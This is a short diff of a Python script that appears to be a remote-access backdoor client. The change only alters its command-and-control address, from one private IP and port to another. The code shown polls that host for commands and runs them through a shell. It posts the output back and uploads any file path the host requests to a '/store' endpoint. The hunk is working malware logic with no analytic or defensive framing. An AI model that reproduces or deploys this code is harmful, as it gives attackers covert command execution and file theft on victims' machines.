@@ -25,24 +25,24 @@ def connect():
             key.Close()
 
         while True:
-            req = requests.get('http://192.168.1.24:8081')
+            req = requests.get('http://192.168.1.23:8085')
             command = req.text
             if 'terminate' in command:
                 return 1
             elif 'grab' in command:
                 grab, path = command.split("*")
                 if os.path.exists(path):
-                    url = "http://192.168.1.24:8081/store"
+                    url = "http://192.168.1.23:8085/store"
                     files = {'file': open(path, 'rb')}
                     r = requests.post(url, files=files)
                 else:
-                    post_response = requests.post(url='http://192.168.1.24:8081',
+                    post_response = requests.post(url='http://192.168.1.23:8085',
                                                   data='[-] Not able to find the file!'.encode())
             else:
                 CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
-                post_response = requests.post(url='http://192.168.1.24:8081', data=CMD.stdout.read())
-                post_response = requests.post(url='http://192.168.1.24:8081', data=CMD.stderr.read())
+                post_response = requests.post(url='http://192.168.1.23:8085', data=CMD.stdout.read())
+                post_response = requests.post(url='http://192.168.1.23:8085', data=CMD.stderr.read())
             time.sleep(3)
 
 
